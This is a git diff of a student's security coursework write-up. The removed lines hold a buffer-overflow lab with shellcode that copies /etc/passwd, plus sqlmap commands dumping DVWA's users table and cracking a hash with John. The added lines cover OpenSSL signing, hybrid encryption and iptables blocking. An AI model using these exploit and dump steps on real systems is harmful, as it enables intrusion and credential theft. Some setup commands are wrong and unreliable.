@@ -1,194 +1,196 @@
-# Lab #1,22119054, Luu Trong Dung, INSE331280E_01FIE
-# Task 1: Software buffer overflow attack
+# Lab #2,22119054, Luu Trong Dung, INSE331280E_01FIE
+# Setup
+
+Dockerfile
+```
+FROM ubuntu
+WORKDIR /app
+```
+
+Bulid image
+```
+docker build ubuntu1 .
+```
+
+
+
+Start containers u1, u2, u3
+![](./images/Screenshot%202024-11-25%20081718.png)
+![](./images/Screenshot%202024-11-25%20091911.png)
+Inside u1 use the command:
+```
+docker attach u1
+```
+```
+docker apt-get update 
+```
+
+```
+docker apt-get install openssl
+```
+
+
+Inside u2 use the command:
+```
+docker attach u2
+```
+```
+docker apt-get update 
+```
+
+```
+docker apt-get install openssl
+```
+# Task 1: Transfer files between computers  
 **Question 1**: 
-- Compile asm program and C program to executable code. 
-- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
-- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
-  
+Conduct transfering a single plaintext file between 2 computers, 
+Using openssl to implementing measures manually to ensure file integerity and authenticity at sending side, 
+then veryfing at receiving side. 
 
 **Answer 1**:
-## 1. Create a text file named `bof.c`:
-```sh
-#include <stdio.h>
-#include <string.h>
-void redundant_code(char *p)
-{
-    char local[256];
-    strncpy(local, p, 20);
-    printf("redundant code\n");
-}
-int main(int argc, char *argv[])
-{
-    char buffer[16];
-    strcpy(buffer, argv[1]);
-    return 0;
-}
+
+Create private key
+```
+openssl genrsa -out private_k.pem 2048
 ```
 
-## 2. Create a text file named `shellcode.asm`:
-```sh
-global _start
-section .text
-_start:
-    xor eax,eax
-    mov al,0x5
-    xor ecx,ecx
-    push ecx
-    push 0x64777373 
-    push 0x61702f63
-    push 0x74652f2f
-    lea ebx,[esp +1]
-    int 0x80
-
-    mov ebx,eax
-    mov al,0x3
-    mov edi,esp
-    mov ecx,edi
-    push WORD 0xffff
-    pop edx
-    int 0x80
-    mov esi,eax
-
-    push 0x5
-    pop eax
-    xor ecx,ecx
-    push ecx
-    push 0x656c6966
-    push 0x74756f2f
-    push 0x706d742f
-    mov ebx,esp
-    mov cl,0102o
-    push WORD 0644o
-    pop edx
-    int 0x80
-
-    mov ebx,eax
-    push 0x4
-    pop eax
-    mov ecx,edi
-    mov edx,esi
-    int 0x80
-
-    xor eax,eax
-    xor ebx,ebx
-    mov al,0x1
-    mov bl,0x5
-    int 0x80
+Create public key from private key
+```
+openssl rsa -in private_k.pem -pubout -out public_k.pem
 ```
 
-## 3.Compile asm program and C program to executable code. 
-Step 1: First compile the code
-before compile must run docker
-```sh
-docker run -it --privileged -v 'E:\Learn\Secure\KT:/home/seed/seclabs' securelabs
+Create plaintext.text and hash it
 ```
-compile C program
-```sh
-gcc -g bof.c -o bof.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
-```
-Compile asm program 
-```sh
-nasm -f elf32 shellcode.asm -o shellcode.o
-```
-linking asm
-```sh
-ld -o shellcode shellcode.o
-```
-## 4.Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
-
-Step2: insert the compiled file bof.out into gdb to see the address of the redundant_code() function and record the address
-```sh
-gdb -q bof.out
-```
-save address of redundant_code: 0x0804846b
-```sh
-disas redundant_code
-```
-![](./images/Screenshot%202024-10-21%20083428.png)
-
-
-Step 3: Exit the GDB and start the attack by inserting the address of the function that was saved in the upper step of Return.
-```sh
-./bof.out $(python -c "print('a'*20 + '\x6b\x84\x04\x08')")
+echo "Hello" > plaintext.txt 
+openssl dgst -sha256 -binary -out file.hash plaintext.txt
 ```
 
-output screenshot (optional)
-![](./images/Screenshot%202024-10-21%20084105.png)
-
-
-# Task 2: Attack on database of DVWA
-- Install dvwa (on host machine or docker container)
-- Make sure you can login with default user
-- Install sqlmap
-- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 
-  
-## Setup
-Step1: Install dvwa and sqlmap
-
-Install dvwa
-```sh
-docker run --rm -it -p 80:80 vulnerables/web-dvwa
+Create signature with private key and file.hash
 ```
-Install sqlmap
-```sh
-sudo apt update
-sudo apt install sqlmap
+ openssl pkeyutl -sign -inkey private_k.pem -in file.hash -out file.signature
 ```
 
-Step2: next to the browser, type in the URL bar "localhost:80" and log in with (Admin, password)
-![](./images/Screenshot%202024-10-21%20094110.png)
-
-Step3: then select sql injection and fill in 1 user ID of any submit, then copy URl 
-![](./images/Screenshot%202024-10-21%20094223.png)
-
-Step4: next press f12 to find and save Cockie
-![](./images/Screenshot%202024-10-21%20094329.png)
-
-**Question 1**: Use sqlmap to get information about all available databases
-**Answer 1**: This command includes the URL and cookie saved in the Setup steps
-```sh
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=j1jkcruu09uddv6q2jbbc7a125; security=low" --dbs
+Open HTTP for U2 to retrieve the files in U1
+```
+python3 -m http.server 8000
 ```
 
-![](./images/Screenshot%202024-10-21%20094903.png)
-
-**Question 2**: Use sqlmap to get tables, users information
-**Answer 2**: The figure below contains 2 tables in the DVWA database, User and Guestbook
-use sqlmap to get tables 
-```sh
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=j1jkcruu09uddv6q2jbbc7a125; security=low" --dbs --tables
+In U2 get encrypted_file.bin, file.hash, file.signature, aes_k.txt from u1
 ```
-![](./images/Screenshot%202024-10-21%20095522.png)
+wget http://172.17.0.2:8000/encrypted_file.bin
+wget http://172.17.0.2:8000/file.hash
+wget http://172.17.0.2:8000/file.signature
+wget http://172.17.0.2:8000/aes_k.txt
 
-use sqlmap to get infomation of users table in database dvwa
-```sh
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=j1jkcruu09uddv6q2jbbc7a125; security=low" -D dvwa -T users --columns
-```
-![](./images/Screenshot%202024-10-21%20100555.png)
-
-
-**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
-**Answer 3**:
-
-```sh
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=j1jkcruu09uddv6q2jbbc7a125; security=low" -D dvwa -T users --dump   
-```
-With the above command we get the data in the users table
-![](./images/Screenshot%202024-10-21%20102134.png)
-
-Retrieve the hashed password of any user
-```sh
-echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
 ```
 
-Install John
-```sh
-sudo apt update
-sudo apt install john -y
+ 
+# Task 2: Transfering encrypted file and decrypt it with hybrid encryption. 
+**Question 1**:
+Conduct transfering a file (deliberately choosen by you) between 2 computers. 
+The file is symmetrically encrypted/decrypted by exchanging secret key which is encrypted using RSA. 
+All steps are made manually with openssl at the terminal of each computer.
+
+**Answer 1**:
+Generate RSA private key
+```
+openssl genpkey -algorithm RSA -out private.pem -aes256
+```
+Extract the public key from the private key
+```
+openssl rsa -pubout -in private.pem -out public.pem
+```
+Generate a random 256-bit symmetric key
+```
+openssl rand -out symmetric.key 32
+```
+Encrypt the file using AES-256 with the symmetric key
+```
+openssl enc -aes-256-cbc -in example.txt -out example.txt.enc -pass file:symmetric.key
+```
+Encrypt the symmetric key with Computer B's RSA public key
+```
+openssl rsautl -encrypt -inkey /path/to/computer_b/public.pem -pubin -in symmetric.key -out symmetric.key.enc
 ```
 
-Use John decrypt hashes password save in hashes.txt, with format=md5
-```sh
-john --format=md5crypt hashes.txt
+# Task 3: Firewall configuration
+**Question 1**:
+From VMs of previous tasks, install iptables and configure one of the 2 VMs as a web and ssh server. Demonstrate your ability to block/unblock http, icmp, ssh requests from the other host.
+
+**Answer 1**:
+## ICMP
+Initially, when ICMP is not blocked, U2 can ping to U3 (172.17.0.4)
+```
+ping 172.17.0.4
+```
+![](./images/Screenshot%202024-11-25%20092848.png)
+
+
+
+In U3 block ICMP from source coming from U2 (172.17.0.3) 
+```
+iptables -A INPUT -p icmp --source 172.17.0.3 -j REJECT
 ```
 
+Alter blocked u2 cant ping to U3
+
+```
+ping 172.17.0.4
+```
+![](./images/Screenshot%202024-11-25%20092731.png)
+
+
+
+## HTTP
+Listen on port 80 of U3 by nc
+```
+nc -l -p 80
+
+```
+
+Try connecting to U3 using HTTP
+```
+curl 172.17.0.4:80
+
+```
+
+U3 agrees to connect from U2 to HTTP
+![](./images/Screenshot%202024-11-25%20095230.png)
+
+
+U3 blocks port 80 with power coming from U2
+```
+iptables -A INPUT -p tcp -s 172.17.0.3 --dport 80 -j REJECT
+```
+
+Try connecting to U3 using HTTP, Unable to connect to U3 using HTTP because it has been blocked
+```
+curl 172.17.0.4:80
+```
+![](./images/Screenshot%202024-11-25%20095319.png)
+
+After deletion, U3 received an HTTP connection from U2
+```
+iptables -D INPUT -p tcp -s 172.17.0.3 --dport 80 -j REJECT
+```
+![](./images/Screenshot%202024-11-25%20101249.png)
+
+#SSH
+Listen on port 22 of U3 by nc
+```
+nc -l -p 22
+
+```
+
+Try connecting to U3 using SSH
+```
+ssh root@172.17.0.4
+```
+U3 agrees to connect from U2 to SSH
+![](./images/Screenshot%202024-11-25%20102810.png)
+
+
+U3 blocks port 22 with power coming from U2
+```
+ iptables -A INPUT -p tcp -s 172.17.0.3 --dport 22 -j REJECT
+```
